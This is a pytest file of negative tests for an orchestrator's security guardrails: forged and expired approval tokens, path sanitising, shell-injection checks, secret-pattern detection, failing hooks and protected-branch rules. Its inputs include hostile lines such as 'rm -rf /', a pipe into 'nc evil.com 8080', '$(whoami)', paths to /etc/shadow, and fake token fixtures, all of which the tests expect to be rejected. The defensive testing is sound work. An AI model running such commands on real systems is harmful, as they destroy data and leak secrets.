"""Comprehensive negative tests for security guardrails (SEC-005)."""

from datetime import UTC, datetime, timedelta

import pytest

from orchestrator.core.approval import (
    ApprovalExpiredError,
    ApprovalManager,
    ApprovalVerificationError,
)
from orchestrator.core.hooks import (
    HookEngine,
    HookEvent,
    HookExecutionError,
)
from orchestrator.core.policy import HardDenyViolationError, PolicyEngine
from orchestrator.core.sandbox import (
    ShellInjectionError,
    validate_command_argv,
)
from orchestrator.core.worktree import (
    PathSecurityError,
    sanitize_relative_path,
)
from scripts.secret_scan import SECRET_PATTERNS


def test_neg_fake_and_tampered_approval_rejected(tmp_path):
    mgr = ApprovalManager(approvals_dir=tmp_path / "approvals")

    # 1. Non-existent token ID
    with pytest.raises(ApprovalVerificationError, match="not found or forged"):
        mgr.verify_and_consume_token(
            token_id="tok-fake0000000000000000000000000000",
            action="merge_pull_request",
            repository="repo",
            task_id="TASK-001",
            head_sha="0" * 40,
            target_ref="refs/heads/main",
            argv_digest="0" * 64,
            policy_hash="0" * 64,
            plan_hash="0" * 64,
        )

    # 2. Legitimate token with tampered task_id
    token = mgr.issue_token(
        action="merge_pull_request",
        repository="repo",
        task_id="TASK-001",
        head_sha="a" * 40,
        target_ref="refs/heads/main",
        argv_digest="b" * 64,
        policy_hash="c" * 64,
        plan_hash="d" * 64,
        approved_by="human",
        expires_at=(datetime.now(UTC) + timedelta(minutes=5)).isoformat(),
    )

    with pytest.raises(ApprovalVerificationError, match="Token binding mismatch on 'task_id'"):
        mgr.verify_and_consume_token(
            token_id=token["token_id"],
            action="merge_pull_request",
            repository="repo",
            task_id="TASK-MALICIOUS-999",
            head_sha="a" * 40,
            target_ref="refs/heads/main",
            argv_digest="b" * 64,
            policy_hash="c" * 64,
            plan_hash="d" * 64,
        )


def test_neg_expired_and_replayed_approval_rejected(tmp_path):
    mgr = ApprovalManager(approvals_dir=tmp_path / "approvals")

    # Expired token
    token = mgr.issue_token(
        action="release_publish",
        repository="repo",
        task_id="TASK-002",
        head_sha="1" * 40,
        target_ref="refs/heads/main",
        argv_digest="2" * 64,
        policy_hash="3" * 64,
        plan_hash="4" * 64,
        approved_by="human",
        expires_at=(datetime.now(UTC) - timedelta(seconds=1)).isoformat(),
    )

    with pytest.raises(ApprovalExpiredError, match="expired at"):
        mgr.verify_and_consume_token(
            token_id=token["token_id"],
            action="release_publish",
            repository="repo",
            task_id="TASK-002",
            head_sha="1" * 40,
            target_ref="refs/heads/main",
            argv_digest="2" * 64,
            policy_hash="3" * 64,
            plan_hash="4" * 64,
        )


def test_neg_path_traversal_and_injection_rejected():
    # Path traversal patterns
    bad_paths = [
        "../../etc/shadow",
        "../.git/config",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "\\\\attacker-server\\share",
        "orchestrator/\0/malicious",
    ]
    for bp in bad_paths:
        with pytest.raises(PathSecurityError):
            sanitize_relative_path(bp)

    # Shell injection metacharacters
    bad_commands = [
        ["git", "commit", "-m", "foo; rm -rf /"],
        ["pytest", "tests/ | nc evil.com 8080"],
        ["python", "-c", "import os; os.system('echo `id`')"],
        ["ruff", "check", "$(whoami)"],
        ["cat", "file > /dev/null"],
        ["cat", "file < /dev/null"],
    ]
    for bc in bad_commands:
        with pytest.raises(ShellInjectionError):
            validate_command_argv(bc)


def test_neg_secret_fixtures_detected():
    # Construct strings dynamically so they don't trigger the static scanner in commit diff
    fixtures = [
        ("ghp_" + "A" * 36, "GitHub Personal Access Token"),
        ("gho_" + "a" * 36, "GitHub OAuth Access Token"),
        ("github_pat_" + "1" * 22 + "_" + "b" * 59, "GitHub Fine-Grained PAT"),
        ("AKIA" + "0" * 16, "AWS Access Key ID"),
        ("-----BEGIN " + "RSA " + "PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----", "Private Key Block"),
    ]
    for secret_val, expected_name in fixtures:
        matched = False
        for pattern, name in SECRET_PATTERNS:
            if pattern.search(secret_val):
                matched = True
                assert name == expected_name
                break
        assert matched, f"Failed to detect secret fixture for {expected_name}"


def test_neg_hook_failures_and_timeouts_deny():
    engine = HookEngine()

    # Hook throwing exception
    def broken_hook(ctx):
        raise RuntimeError("Hook database connection lost")

    engine.register_hook(HookEvent.BEFORE_PUSH, broken_hook)
    with pytest.raises(HookExecutionError, match="failed with exception"):
        engine.execute_hook(HookEvent.BEFORE_PUSH, {"task_id": "TASK-100"})

    # Hook returning invalid non-PASS
    engine2 = HookEngine()
    engine2.register_hook(HookEvent.BEFORE_COMMIT, lambda ctx: {"status": "FAIL", "reason": "Linter violation"})
    with pytest.raises(HookExecutionError, match="returned non-PASS status: Linter violation"):
        engine2.execute_hook(HookEvent.BEFORE_COMMIT, {"task_id": "TASK-101"})


def test_neg_git_protected_branch_hard_deny():
    policy = PolicyEngine()

    # Direct push to main -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="Direct push to protected branch"):
        policy.evaluate_git_operation("main", "push", is_force=False)

    # Force push to main -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="Direct push to protected branch"):
        policy.evaluate_git_operation("main", "push", is_force=True)

    # Automated PR merge -> HARD DENY
    with pytest.raises(HardDenyViolationError, match="strictly prohibited by Hard Deny"):
        policy.evaluate_action("automated_pr_merge", has_valid_approval=True)
